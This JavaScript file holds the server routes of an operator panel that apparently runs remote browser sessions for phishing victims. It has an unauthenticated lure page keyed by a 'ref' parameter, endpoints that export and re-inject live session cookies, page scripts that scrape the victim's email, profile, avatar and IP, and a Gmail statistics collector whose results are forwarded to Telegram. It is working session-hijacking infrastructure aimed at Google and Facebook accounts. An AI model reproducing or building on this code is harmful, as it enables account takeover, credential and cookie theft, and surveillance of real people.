// Panel API routes: browser-session control.

import { loadAccounts, getAccount, getAccountByRef, saveAccount, deleteAccount } from '../accounts.js';
import * as browser from '../browser.js';
import { collectGmailStats, formatStatsForTelegram } from '../gmail-stats.js';
import * as telegram from '../telegram.js';
import { verifyUser, userCount } from '../users.js';
import { isLocked, lockoutRemainingMs, recordFailure, recordSuccess, createSession, getSession, deleteSession } from '../sessions.js';

// ── Cookie helpers ────────────────────────────────────────────────────────────

function parseCookies(header) {
  const cookies = {};
  if (!header) return cookies;
  for (const part of header.split(';')) {
    const idx = part.indexOf('=');
    if (idx < 0) continue;
    const k = part.slice(0, idx).trim();
    const v = part.slice(idx + 1).trim();
    if (k) cookies[k] = decodeURIComponent(v);
  }
  return cookies;
}

function sessionCookie(token, maxAge = 604800) {
  return `session=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${maxAge}`;
}

// Returns the authenticated username, or sends 401 and returns false.
function checkAuth(req, reply) {
  const cookies = parseCookies(req.headers.cookie);
  const username = getSession(cookies.session || '');
  if (!username) {
    reply.code(401).send({ error: 'not_authenticated' });
    return false;
  }
  return username;
}

// ── Auth routes ───────────────────────────────────────────────────────────────

export default async function panelRoutes(app) {

  app.post('/api/login', async (req, reply) => {
    if (isLocked(req.ip)) {
      const retryAfterMs = lockoutRemainingMs(req.ip);
      return reply.code(429).send({ error: 'too_many_attempts', retryAfterMs });
    }

    const { username, password } = req.body || {};
    if (typeof username !== 'string' || typeof password !== 'string' || !username || !password) {
      return reply.code(400).send({ error: 'username and password are required' });
    }

    const valid = await verifyUser(username.trim().toLowerCase(), password);
    if (!valid) {
      recordFailure(req.ip);
      return reply.code(401).send({ error: 'invalid_credentials' });
    }

    recordSuccess(req.ip);
    const token = createSession(username.trim().toLowerCase());
    reply.header('set-cookie', sessionCookie(token));
    return { ok: true };
  });

  app.post('/api/logout', async (req, reply) => {
    const cookies = parseCookies(req.headers.cookie);
    if (cookies.session) deleteSession(cookies.session);
    reply.header('set-cookie', sessionCookie('', 0));
    return { ok: true };
  });

  // ── Panel API — all require a valid session ────────────────────────────────

  app.get('/api/accounts', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const accounts = await loadAccounts();
    return accounts.map((a) => ({ ...a, ...browser.status(a.id) }));
  });

  app.get('/api/logs', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const since = Number(req.query?.since) || 0;
    return browser.getLogs(since);
  });

  app.post('/api/accounts', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const { id, label, startUrl } = req.body || {};
    if (!id || !label || !startUrl)
      return reply.code(400).send({ error: 'id, label and startUrl are required' });
    if (!/^[a-z0-9_-]+$/.test(id))
      return reply.code(400).send({ error: 'id must be lowercase letters, digits, _ or -' });
    const isGoogle = /(^|\.)google\.com$/.test(new URL(startUrl).hostname);
    await saveAccount({ id, label, startUrl, ...(isGoogle ? { useProxy: false } : {}) });
    await browser.start(id, req.ip).catch(() => {});
    return { ok: true, id };
  });

  app.delete('/api/accounts/:id', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const { id } = req.params;
    if (!await getAccount(id)) return reply.code(404).send({ error: 'unknown_account' });
    await browser.stop(id).catch(() => {});
    await deleteAccount(id);
    return { ok: true };
  });

  app.post('/api/accounts/:id/start', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    return browser.start(req.params.id, req.ip);
  });

  app.post('/api/accounts/:id/stop', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    return browser.stop(req.params.id);
  });

  app.patch('/api/accounts/:id', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const { notes, password, email } = req.body || {};
    await saveAccount({ ...acc, notes, password, email });
    return { ok: true };
  });

  app.get('/api/accounts/:id/status', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    return browser.status(req.params.id);
  });

  app.get('/api/accounts/:id/screenshot', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    const page = browser.getPage(req.params.id);
    if (!page) return reply.code(409).send({ error: 'session_not_running' });
    const buf = await page.screenshot({ type: 'jpeg', quality: 70, timeout: 8000 });
    reply.header('content-type', 'image/jpeg');
    return reply.send(buf);
  });

  app.get('/api/accounts/:id/cookies', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const ctx = browser.getContext(req.params.id);
    if (!ctx) return reply.code(409).send({ error: 'session_not_running' });
    const cookies = await ctx.cookies();
    reply.header('content-type', 'application/json');
    reply.header('content-disposition', `attachment; filename="${req.params.id}-cookies.json"`);
    return reply.send(JSON.stringify(cookies, null, 2));
  });

  app.post('/api/accounts/:id/cookies', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const ctx = browser.getContext(req.params.id);
    if (!ctx) return reply.code(409).send({ error: 'session_not_running' });
    const cookies = req.body;
    if (!Array.isArray(cookies)) return reply.code(400).send({ error: 'expected a JSON array of cookies' });
    await ctx.addCookies(cookies);
    const page = browser.getPage(req.params.id);
    if (page) await page.goto(acc.startUrl, { waitUntil: 'commit' }).catch(() => {});
    return { ok: true, count: cookies.length };
  });

  const withTimeout = (promise, ms = 5000) =>
    Promise.race([promise, new Promise((resolve) => setTimeout(() => resolve(null), ms))]);

  app.get('/api/accounts/:id/info', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    const page = browser.getPage(req.params.id);
    if (!page) return { running: false };
    const url = page.url();
    const [title, loginHint, avatarUrl, userAgent, ip] = await Promise.all([
      withTimeout(page.title().catch(() => '')),
      withTimeout(page.evaluate(() => {
        const gEl = document.querySelector('[aria-label*="@"]');
        if (gEl) {
          const m = gEl.getAttribute('aria-label').match(/[\w.+-]+@[\w.-]+\.\w+/);
          if (m) return m[0];
        }
        const fbEl = document.querySelector('[aria-label="Twój profil"]') ||
                     document.querySelector('[aria-label="Your profile"]');
        if (fbEl) return fbEl.getAttribute('aria-label');
        const og = document.querySelector('meta[property="og:title"]');
        if (og) return og.content;
        return null;
      }).catch(() => null)),
      withTimeout(page.evaluate(() => {
        const el = document.querySelector('img[alt*="profile" i], img[alt*="avatar" i], img[alt*="zdjęcie" i]');
        return el ? el.src : null;
      }).catch(() => null)),
      withTimeout(page.evaluate(() => navigator.userAgent).catch(() => null)),
      withTimeout(page.evaluate(() => {
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 4000);
        return fetch('https://api.ipify.org?format=json', { signal: ctrl.signal })
          .then((r) => r.json())
          .then((d) => d.ip)
          .catch(() => null)
          .finally(() => clearTimeout(t));
      }).catch(() => null), 6000),
    ]);
    const blocked = (title ?? '') === '' && loginHint === null && userAgent === null;
    return { running: true, title: title ?? '', url, loginHint, avatarUrl, userAgent, ip, blocked };
  });

  // Viewer page — auth handled in JS via WS + API
  app.get('/account/login', async (req, reply) => {
    const ref = req.query?.ref || '';
    if (!ref || !await getAccountByRef(ref)) return reply.code(404).send({ error: 'unknown_ref' });
    return reply.sendFile('view.html');
  });

  app.get('/api/accounts/:id/mail-stats', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const ctx = browser.getContext(req.params.id);
    if (!ctx) return reply.code(409).send({ error: 'session_not_running' });
    const stats = await collectGmailStats(ctx);
    return stats;
  });

  app.get('/api/accounts/:id/mail-stats/progress', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const { id } = req.params;

    reply.raw.writeHead(200, {
      'content-type': 'text/event-stream',
      'cache-control': 'no-cache',
      'connection': 'keep-alive',
    });

    const send = (msg) => reply.raw.write(`data: ${JSON.stringify(msg)}\n\n`);

    const acc = await getAccount(id);
    if (!acc) { send({ done: true, error: 'unknown_account' }); reply.raw.end(); return; }
    const ctx = browser.getContext(id);
    if (!ctx) { send({ done: true, error: 'session_not_running' }); reply.raw.end(); return; }

    try {
      const stats = await collectGmailStats(ctx, (msg) => send({ step: msg }));
      send({ done: true, stats });
      const tgText = formatStatsForTelegram(acc.label, stats);
      telegram.sendMessage(tgText).catch(() => {});
    } catch (err) {
      send({ done: true, error: String(err?.message || err) });
    }
    reply.raw.end();
  });

  app.post('/api/account-by-ref/:ref/start', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const acc = await getAccountByRef(req.params.ref);
    if (!acc) return reply.code(404).send({ error: 'unknown_ref' });
    await browser.start(acc.id, req.ip);
    return { accountId: acc.id };
  });
}
